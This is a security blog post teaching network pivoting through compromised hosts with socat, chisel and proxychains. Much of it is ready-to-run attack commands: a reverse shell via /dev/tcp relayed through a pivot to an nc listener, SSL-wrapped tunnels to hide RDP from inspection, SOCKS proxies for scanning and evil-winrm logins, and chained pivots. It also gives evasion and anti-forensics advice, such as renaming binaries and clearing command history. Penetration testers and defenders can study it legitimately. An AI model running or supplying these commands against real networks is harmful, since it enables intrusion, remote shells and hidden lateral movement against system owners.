---
layout: post
title: "Network Pivoting: Routing Your Access Through Compromised Hosts"
category: "Network Security"
date: 2025-11-20
readTime: "14 min"
tags: [pivoting, socat, chisel, tunneling, post-exploitation, lateral-movement]
excerpt: "When your initial compromise sits in a DMZ, the real network is behind it. We explore how attackers bypass network segmentation through pivoting techniques."
---

# Network Pivoting: Routing Your Access Through Compromised Hosts

## The Segmentation Problem

Modern networks don't exist as flat, homogeneous landscapes. Instead, they're compartmentalized. Your initial foothold lands in a DMZ or perimeter subnet, valuable for what it reveals, but ultimately not what you're after. The crown jewels sit deeper: domain controllers in internal VLANs, database servers in restricted zones, management interfaces behind additional firewalls.

This architectural reality creates a fundamental challenge for attackers and defenders alike. Once inside the perimeter, how do you traverse lateral network boundaries? The firewall that stopped your initial reconnaissance now works differently from the inside, but it still exists. Network segmentation isn't just an external defense, it's internal containment.

This is where pivoting becomes essential. Rather than attacking these internal networks directly (impossible from your external position), you use the compromised host as an intermediary. Every connection routes through the internal network via this gateway machine. The traffic is native to their network, so to their firewalls and IDS systems, it appears legitimate.

## Understanding the Traffic Flow

Before examining tools, let's establish what actually happens during a pivot. Consider a typical scenario:

- Your Kali box is on `10.10.14.0/24` (external)
- Compromised DMZ host is on `10.10.10.50` (perimeter subnet)
- Internal network is `192.168.1.0/24` (restricted VLAN)

Without pivoting, when you attempt to connect to `192.168.1.100:80` from your Kali box, the firewall drops the traffic. The routing tables on your machine don't even know how to reach that network legitimately.

With pivoting, you establish a tunnel through the DMZ host. Now when you request `localhost:8080` on your machine, the traffic flows through: Kali to DMZ host to Internal host. The firewall sees internal-to-internal traffic, which it permits. The internal host responds through the same path.

From the network's perspective, there's nothing unusual. A host on the DMZ is communicating with internal resources. This happens constantly in legitimate environments.

## SOCAT: The Foundational Approach

SOCAT is fundamentally a bidirectional data relay. It connects two endpoints and shuffles bytes between them. Its power lies in its flexibility. These endpoints can be TCP sockets, Unix sockets, files, processes, or even SSL/TLS connections.

### Basic Port Forwarding

The simplest pivot is a port forward. You listen on a high-numbered port on the compromised host and tunnel connections back to an internal service.

```bash
socat TCP-LISTEN:8080,fork TCP:192.168.1.100:80
```

This command tells SOCAT: listen on TCP port 8080, and when connections arrive, fork a new process for each one, then connect to the internal web server at 192.168.1.100:80. The `fork` keyword is critical. Without it, only one client could connect before SOCAT closed.

The operator now points their browser to `dmz-ip:8080` and receives pages from the internal server. The internal firewall sees the DMZ host initiating connections (permitted) and responding to them (expected). There's no indication of external involvement.

### Reverse Shell Relaying

This becomes more complex when you need to chain compromises. Suppose you've gained a shell on Host A (the DMZ), but your actual target is Host B, which can only be reached from A.

Traditional reverse shell: you catch a reverse shell from Host B on your Kali box, but Host B can't reach Kali directly. This fails at the network boundary.

With SOCAT on Host A:

```bash
# On your Kali
nc -lvnp 4444

# On Host A (pivot)
socat TCP-LISTEN:5555,fork TCP:kali-ip:4444

# On Host B (target)
bash -i >& /dev/tcp/host-a-ip/5555 0>&1
```

Host B connects to Host A on port 5555. SOCAT relays this connection to your Kali listener. The reverse shell arrives at your listener, authenticated through the trusted intermediary. Host B sees it as connecting to Host A. Host A sees it as connecting outbound (which, from an internal perspective, might be permitted by policy). Your Kali sees an inbound connection from Host A.

### Encryption Considerations

As sophistication increases, so does defensive monitoring. A network defender running IDS/IPS systems can fingerprint clear-text protocols. SSH, RDP, and HTTP traffic have distinctive patterns. Encrypted traffic is harder to categorize.

SOCAT supports SSL/TLS wrapping. This doesn't hide the traffic (defenders still see network flows), but it obscures the content from DPI (Deep Packet Inspection) systems.

```bash
# Generate self-signed certificate
openssl req -newkey rsa:2048 -nodes -keyout pivot.key -x509 -days 365 -out pivot.crt
cat pivot.key pivot.crt > pivot.pem

# On the DMZ host
socat OPENSSL-LISTEN:443,cert=pivot.pem,verify=0,fork TCP:192.168.1.100:3389

# On your Kali (if you want to access it)
socat TCP-LISTEN:13389 OPENSSL:dmz-ip:443,verify=0
```

Now RDP traffic to the internal server flows through an SSL tunnel. From the network's perspective, it's encrypted HTTPS-like traffic. An IDS can flag it as suspicious (why is a DMZ host conducting SSL to internal resources?), but the actual RDP protocol details are hidden.

## Chisel: Modern HTTP-Based Tunneling

SOCAT is powerful but somewhat dated in its approach. Chisel represents a different design philosophy: assume restrictive firewall policies and design around them.

Many corporate networks permit HTTP and HTTPS outbound traffic. These are fundamental to business operations. An IDS might scrutinize these connections, but blocking them entirely isn't feasible. Chisel exploits this reality by tunneling over HTTP, encrypted via SSH.

### Architecture

Chisel operates on a client-server model. The server runs on your attacking machine (or an intermediate relay). The client runs on the compromised host. They establish an SSH connection over HTTP, which then carries tunnel traffic.

### Reverse Port Forwarding

The most common deployment mirrors SOCAT's port forward but with better encryption.

```bash
# On your Kali (server)
./chisel server --reverse --port 8000

# On compromised host (client)
./chisel client kali-ip:8000 R:8080:192.168.1.100:80
```

The `--reverse` flag is significant. Normally, the server listens and accepts connections. Here, the client connects to the server and establishes a reverse tunnel. The listening port (`8080`) appears on your Kali machine.

This offers advantages over SOCAT:

- Built-in SSH encryption (SOCAT requires manual SSL setup)
- Cross-platform compatibility (single binary works on Linux, Windows, macOS)
- Written in Go, so it's performant
- The client initiates the connection, which can traverse proxies and NAT

### SOCKS Proxy: The Comprehensive Solution

Rather than forwarding individual ports, Chisel can establish a SOCKS proxy. This is more versatile. Any tool configured to use a SOCKS proxy can tunnel through the compromised host.

```bash
# On your Kali (server)
./chisel server --reverse --port 8000

# On compromised host (client)
./chisel client kali-ip:8000 R:socks
```

Chisel listens on port 1080 on your local machine. Any traffic sent to this port travels through the compromised host and onward to the destination.

Now you can use proxychains to route any command through this tunnel:

```bash
# Edit /etc/proxychains4.conf
[ProxyList]
socks5 127.0.0.1 1080

# Use it
proxychains nmap -sT -Pn 192.168.1.0/24
proxychains smbclient -L //192.168.1.10
proxychains evil-winrm -i 192.168.1.10 -u admin -p password
```

Every network tool now operates as if you're on the internal network. This is more versatile than individual port forwards. You don't need to predict which services you'll target, you can enumerate the network dynamically.

## Chaining Multiple Pivots

As you progress deeper into a network, you might encounter additional segmentation. Your first compromise reaches a DMZ. Behind that DMZ is a management VLAN. Behind that is the production network. Each boundary requires an additional pivot.

This is theoretically straightforward: the second pivot relays through the first, the third through the second, and so on. In practice, complexity emerges.

```bash
# On Kali
./chisel server --reverse --port 8000

# On First Pivot (DMZ host)
./chisel client kali-ip:8000 R:socks &
./chisel server --port 9000 --reverse

# On Second Pivot (Management VLAN host)
./chisel client first-pivot-ip:9000 R:9001:third-network-host:80
```

You've created a relay chain. Kali connects to the first pivot, establishing a SOCKS proxy. The first pivot connects to the second, forwarding port 9001. Now `localhost:9001` on your Kali reaches deep into the third network.

The practical limit is usually latency and debugging difficulty, not technical capability. Each hop adds latency. If your attack fails, determining where in the chain the problem exists becomes challenging.

## Operational Security Considerations

These techniques work, but they generate evidence. Network defenders analyze traffic patterns, study unusual connections, and review logs.

When tunneling, consider:

- **Port selection**: Avoid high-numbered ports on well-known services. Port 8080 on a DMZ host is suspicious if that host never typically services web traffic.
- **Volume**: Tunneling large amounts of data (like a full network scan) creates distinctive patterns. Attackers often conduct reconnaissance in smaller batches, spread over time.
- **Process artifacts**: The chisel or socat binary itself might trigger endpoint detection. Renaming or obfuscating binaries is common practice.
- **Cleanup**: Removing evidence of tunnels (deleting binaries, clearing command history) is part of the engagement.

## When to Use Each Tool

**SOCAT** is appropriate when:
- You need Unix socket manipulation
- You're already on the target and need quick forwarding
- SSL/TLS encryption isn't critical
- The target has limited disk space (SOCAT is smaller)

**Chisel** is appropriate when:
- You need a persistent, encrypted tunnel
- The environment has restrictive outbound policies (HTTP/HTTPS allowed)
- You want cross-platform compatibility
- You need to tunnel multiple services simultaneously

In practice, many engagements use both. SOCAT for initial quick pivots, Chisel for establishing persistent tunnel infrastructure.

## Conclusion

Network pivoting bridges the gap between network segmentation and attacker objectives. By converting a compromised host into a relay, attackers access otherwise isolated networks. Defenders implement segmentation specifically to prevent this. The cat-and-mouse dynamic between pivoting techniques and defensive detection remains ongoing.

Understanding these techniques is essential for both offensive security professionals and defenders building detection systems. The tools themselves are straightforward, the art lies in deployment: when to use them, how to conceal them, and how to chain them across multiple network boundaries.
